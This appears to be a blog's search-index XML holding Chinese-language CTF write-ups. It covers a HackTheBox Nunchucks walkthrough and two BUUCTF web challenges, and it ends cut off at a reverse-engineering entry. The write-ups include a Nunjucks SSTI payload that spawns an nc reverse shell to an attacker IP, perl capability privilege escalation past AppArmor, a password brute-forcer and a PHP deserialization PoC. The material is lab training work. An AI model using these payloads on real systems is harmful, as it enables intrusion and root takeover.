<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox Nunchucks Walkthrough</title>
      <link href="/2022/02/11/HackTheBox-Nunchucks-Walkthrough/"/>
      <url>/2022/02/11/HackTheBox-Nunchucks-Walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.222 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line"><span class="comment"># $ports=22,80</span></span><br><span class="line"></span><br><span class="line">nmap -sC -sV -p<span class="variable">$ports</span> 10.10.11.122</span><br><span class="line"><span class="comment"># Nmap 7.92 scan initiated Wed Feb  9 22:22:20 2022 as: nmap -sC -sV -p22,80,443 -v -oN nmaplog.txt 10.10.11.122</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.122</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)</span><br><span class="line">|   256 a2:f4:2c:42:74:65:a3:7c:26:<span class="built_in">dd</span>:49:72:23:82:72:71 (ECDSA)</span><br><span class="line">|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)</span><br><span class="line">80/tcp  open  http     nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https://nunchucks.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Nunchucks - Landing Page</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK</span><br><span class="line">| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb</span><br><span class="line">| Issuer: commonName=Nunchucks-CA/countryName=US</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2021-08-30T15:42:24</span><br><span class="line">| Not valid after:  2031-08-28T15:42:24</span><br><span class="line">| MD5:   57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4</span><br><span class="line">|_SHA-1: 518c 0fd1 6903 75c0 f26b a6cb e37d 53b8 a3ff 858b</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done 1 IP address (1 host up) scanned in 34.33 seconds</span></span><br></pre></td></tr></table></figure><h2 id="Web-Application"><a href="#Web-Application" class="headerlink" title="Web Application"></a>Web Application</h2><p>修改hosts文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;10.10.11.122  nunchucks.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>访问网站，自动转为https协议，扫描目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&#x27;https://nunchucks.htb&#x27;</span>   </span><br><span class="line">[23:09:36] Starting:                       </span><br><span class="line">[23:09:42] 400 -  166B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            </span><br><span class="line">[23:10:37] 301 -  179B  - /assets  -&gt;  /assets/                            </span><br><span class="line">[23:10:44] 400 -  166B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd    </span><br><span class="line">[23:11:16] 200 -    9KB - /login           </span><br><span class="line">[23:11:17] 200 -    9KB - /login/          </span><br><span class="line">[23:11:37] 200 -   19KB - /privacy         </span><br><span class="line">[23:11:42] 400 -    1KB - /servlet/%C0%AE%C0%AE%C0%AF                      </span><br><span class="line">[23:11:45] 200 -    9KB - /signup          </span><br><span class="line">[23:11:53] 200 -   17KB - /terms           </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p>发现注册和登录页面，访问注册页面进行注册</p><p><img src="https://raw.githubusercontent.com/DojoKuro/blog_img/main/202306051731941.png" alt="singup"></p><p><img src="https://raw.githubusercontent.com/DojoKuro/blog_img/main/202306051731028.png" alt="login"></p><p>注册、登录均关闭，继续爆破子域名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 2271 -H <span class="string">&quot;Host: FUZZ.nunchucks.htb&quot;</span>  -u <span class="string">&quot;https://nunchucks.htb&quot;</span>            </span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: https://nunchucks.htb/</span><br><span class="line">Total requests: 4997</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload      </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000081:   200        101 L    259 W      4028 Ch     <span class="string">&quot;store&quot;</span> </span><br></pre></td></tr></table></figure><p>hosts文件加入store.nunchucks.htb后访问页面</p><p><img src="https://raw.githubusercontent.com/DojoKuro/blog_img/main/202306051732197.png" alt="store"></p><hr><h1 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>输入邮箱地址，通过burp抓包修改参数可以发现SSTI漏洞</p><p><img src="https://raw.githubusercontent.com/DojoKuro/blog_img/main/202306051730222.png" alt="burp"></p><blockquote><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks">NUNJUCKS(NodeJS) SSTI vulnerability</a></p></blockquote><p>模板注入反弹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload:&#123;&#123;range.constructor(\&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.4 4444 &gt;/tmp/f&#x27;)\&quot;)()&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.4] from (UNKNOWN) [10.10.11.122] 49368</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/var/www/store.nunchucks</span></span><br><span class="line"><span class="string">$ cd ~</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取sshshell</span></span><br><span class="line"><span class="string">$ mkdir .ssh</span></span><br><span class="line"><span class="string">$ cd .ssh</span></span><br><span class="line"><span class="string">$ echo id_rsa.pub &gt; authorized_keys</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ssh david@10.10.11.122                                                                          </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-86-generic x86_64)                                   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com                                                          </span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com                                                  </span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Fri 11 Feb 01:11:31 UTC 2022                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:             0.55                                                                     </span></span><br><span class="line"><span class="string">  Usage of /:              48.8% of 6.82GB                                                          </span></span><br><span class="line"><span class="string">  Memory usage:            45%                                                                      </span></span><br><span class="line"><span class="string">  Swap usage:              0%                                                                       </span></span><br><span class="line"><span class="string">  Processes:               270                                                                      </span></span><br><span class="line"><span class="string">  Users logged in:         0                                                                        </span></span><br><span class="line"><span class="string">  IPv4 address for ens160: 10.10.11.122                                                             </span></span><br><span class="line"><span class="string">  IPv6 address for ens160: dead:beef::250:56ff:feb9:19d7                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">10 updates can be applied immediately.                                                              </span></span><br><span class="line"><span class="string">To see these additional updates run: apt list --upgradable                                          </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.                                              </span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">david@nunchucks:/tmp$ id</span></span><br><span class="line"><span class="string">uid=1000(david) gid=1000(david) groups=1000(david)</span></span><br></pre></td></tr></table></figure><hr><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>查看可执行文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@nunchucks:/tmp$ find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/null</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/sbin/pppd</span><br></pre></td></tr></table></figure><p>同时查看网站配置文件发现mysql用户名密码，经测试均无法提权</p><p>最后经网上搜索发现通过getcap查看文件capabilities</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@nunchucks:/tmp$ <span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/perl = cap_setuid+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure><p>发现perl有cap_setuid+ep属性，可以通过perl提权<br>参考<a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">https://gtfobins.github.io/gtfobins/perl/#capabilities</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 尝试提权</span></span><br><span class="line">david@nunchucks:/tmp$ perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#x27;</span> </span><br><span class="line">david@nunchucks:/tmp$ <span class="built_in">id</span></span><br><span class="line">uid=1000(david) gid=1000(david) <span class="built_in">groups</span>=1000(david)</span><br><span class="line"><span class="comment"># 未成功 - -</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用其他命令</span></span><br><span class="line">david@nunchucks:/tmp$ perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;id&quot;;&#x27;</span> </span><br><span class="line">uid=0(root) gid=1000(david) <span class="built_in">groups</span>=1000(david)</span><br><span class="line">david@nunchucks:/tmp$ perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;cat /root/root.txt&quot;;&#x27;</span> </span><br><span class="line"><span class="built_in">cat</span>: /root/root.txt: Permission denied <span class="comment"># 无权限，什么鬼？</span></span><br></pre></td></tr></table></figure><p>继续搜索…发现使用了AppArmor技术</p><blockquote><p><strong>AppArmor</strong><br>Introduction<br>AppArmor is a Mandatory Access Control (MAC) system which is a kernel (LSM) enhancement to confine programs to a limited set of resources. AppArmor’s security model is to bind access control attributes to programs rather than to users. AppArmor confinement is provided via profiles loaded into the kernel, typically on boot. AppArmor profiles can be in one of two modes: enforcement and complain. Profiles loaded in enforcement mode will result in enforcement of the policy defined in the profile as well as reporting policy violation attempts (either via syslog or auditd). Profiles in complain mode will not enforce policy but instead report policy violation attempts.<br>AppArmor differs from some other MAC systems on Linux: it is path-based, it allows mixing of enforcement and complain mode profiles, it uses include files to ease development, and it has a far lower barrier to entry than other popular MAC systems.<br>AppArmor is an established technology first seen in Immunix and later integrated into Ubuntu, Novell/SUSE, and Mandriva. Core AppArmor functionality is in the mainline Linux kernel from 2.6.36 onwards; work is ongoing by AppArmor, Ubuntu and other developers to merge additional AppArmor functionality into the mainline kernel.</p></blockquote><p>查看/etc/apparmor.d/usr.bin.perl</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Last Modified: Tue Aug 31 18:25:30 2021</span></span><br><span class="line"><span class="comment">#include &lt;tunables/global&gt;</span></span><br><span class="line"></span><br><span class="line">/usr/bin/perl &#123;</span><br><span class="line">  <span class="comment">#include &lt;abstractions/base&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/nameservice&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/perl&gt;</span></span><br><span class="line"></span><br><span class="line">  capability setuid,</span><br><span class="line"></span><br><span class="line">  deny owner /etc/nsswitch.conf r,</span><br><span class="line">  deny /root/* rwx,</span><br><span class="line">  deny /etc/shadow rwx,</span><br><span class="line"></span><br><span class="line">  /usr/bin/id mrix,</span><br><span class="line">  /usr/bin/ls mrix,</span><br><span class="line">  /usr/bin/cat mrix,</span><br><span class="line">  /usr/bin/whoami mrix,</span><br><span class="line">  /opt/backup.pl mrix,</span><br><span class="line">  owner /home/ r,</span><br><span class="line">  owner /home/david/ r,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无/root的rwx权限，但是有个/opt/backup.pl脚本，查看脚本内容</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl                                                                                     </span></span><br><span class="line"><span class="keyword">use</span> strict;                                                                                         </span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(strftime)</span>;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(setuid)</span>; </span><br><span class="line">POSIX::setuid(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $tmpdir        = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $backup_main = <span class="string">&#x27;/var/www&#x27;</span>;</span><br><span class="line"><span class="keyword">my</span> $now = strftime(<span class="string">&quot;%Y-%m-%d-%s&quot;</span>, <span class="keyword">localtime</span>);</span><br><span class="line"><span class="keyword">my</span> $tmpbdir = <span class="string">&quot;$tmpdir/backup_$now&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">printlog</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[&quot;</span>, strftime(<span class="string">&quot;%D %T&quot;</span>, <span class="keyword">localtime</span>), <span class="string">&quot;] $_[0]\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">archive</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printlog <span class="string">&quot;Archiving...&quot;</span>;</span><br><span class="line">    <span class="keyword">system</span>(<span class="string">&quot;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&quot;</span>);</span><br><span class="line">    printlog <span class="string">&quot;Backup complete in $tmpbdir/backup_$now.tar&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($&gt; != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span> <span class="string">&quot;You must run this script as root.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printlog <span class="string">&quot;Backup starts.&quot;</span>;</span><br><span class="line"><span class="keyword">mkdir</span>($tmpbdir);</span><br><span class="line">&amp;archive;</span><br><span class="line">printlog <span class="string">&quot;Moving $tmpbdir/backup_$now to /opt/web_backups&quot;</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&quot;</span>);</span><br><span class="line">printlog <span class="string">&quot;Removing temporary directory&quot;</span>;</span><br><span class="line"><span class="keyword">rmdir</span>($tmpbdir);</span><br><span class="line">printlog <span class="string">&quot;Completed&quot;</span>;</span><br></pre></td></tr></table></figure><p>脚本通过设置setuid以root用户运行，这样可以按照同样方法写提权脚本</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/tmp/exp.pl</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl                                                                                     </span></span><br><span class="line"><span class="keyword">use</span> strict;                                                                                         </span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(strftime)</span>;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(setuid)</span>; </span><br><span class="line">POSIX::setuid(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;/usr/bin/bash&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@nunchucks:/tmp$ <span class="built_in">chmod</span> +x exp.pl</span><br><span class="line">david@nunchucks:/tmp$ ./exp.pl</span><br><span class="line">root@nunchucks:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(david) <span class="built_in">groups</span>=1000(david)</span><br></pre></td></tr></table></figure><hr><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p><a href="https://fuckcloudnative.io/posts/linux-capabilities-in-practice-1/">Linux Capabilities 入门教程：基础实战篇</a><br><a href="https://gtfobins.github.io/gtfobins">GTFOBins</a><br><a href="https://book.hacktricks.xyz/">HackTricks</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> hackthebox </tag>
            
            <tag> Linux </tag>
            
            <tag> NodeJS </tag>
            
            <tag> SSTI </tag>
            
            <tag> SUID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF - BUU BRUTE 1 Writeup</title>
      <link href="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/"/>
      <url>/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/</url>
      
        <content type="html"><![CDATA[<p>进入题目url查看，是个登录界面，先输入admin/admin发现提示</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">密码错误，为四位数字。</span><br></pre></td></tr></table></figure><p>而且是get请求，结合题目，简单爆破</p><h2 id="crunch生成字典"><a href="#crunch生成字典" class="headerlink" title="crunch生成字典"></a>crunch生成字典</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -f /usr/share/crunch/charset.lst numeric -o adminpass.txt</span><br></pre></td></tr></table></figure><h2 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./adminpass.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">payload = f.readline().strip()</span><br><span class="line"><span class="keyword">while</span> payload:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;\rpayload:&#x27;</span>+payload,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">  res = requests.get(<span class="string">&quot;http://d60d9c19-efe0-4b6a-82c5-0d238a94a44b.node4.buuoj.cn:81/?username=admin&amp;password=&quot;</span>+payload)</span><br><span class="line">  time.sleep(<span class="number">0.2</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">      f.close()</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      payload = f.readline().strip()</span><br></pre></td></tr></table></figure><p>payload:6490登录成功。flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}</p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF - BUU CODE REVIEW 1 Writeup</title>
      <link href="/2022/01/30/BUUCTF-BUU-CODE-REVIEW-1-Writeup/"/>
      <url>/2022/01/30/BUUCTF-BUU-CODE-REVIEW-1-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="打开链接，显示代码"><a href="#打开链接，显示代码" class="headerlink" title="打开链接，显示代码"></a>打开链接，显示代码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: jinzhao</span></span><br><span class="line"><span class="comment"> * Date: 2019/10/6</span></span><br><span class="line"><span class="comment"> * Time: 8:04 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一共要读取5个参数：get参数pleaseget，post参数pleasepost、md51、md52和obj</p><blockquote><p>考点1：php强弱类型比较<br>考点2：uniqid() 函数 //基于以微秒计的当前时间，生成一个唯一的 ID。<br>考点3：引用赋值</p></blockquote><h1 id="php-payload"><a href="#php-payload" class="headerlink" title="php payload:"></a>php payload:</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">BUU</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;input = &amp;<span class="variable">$b</span>-&gt;correct;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment"># O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://1047cab0-ea8a-4945-8421-86af8b408454.node4.buuoj.cn:81/?pleaseget=1&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;pleasepost&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;md51[]&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;md52[]&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;obj&#x27;</span>:<span class="string">&#x27;O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;&#x27;</span>&#125; <span class="comment">#md5值比较绕过有两种方法：1.互联网搜索两个MD5值为0e开头的字符串;2.使用list绕过</span></span><br><span class="line">res = requests.post(url,data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    flag = re.search(<span class="string">r&#x27;flag\&#123;(.*)\&#125;&#x27;</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蒙古马2020 Wirteups:reverse-specialapk</title>
      <link href="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-specialapk/"/>
      <url>/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-specialapk/</url>
      
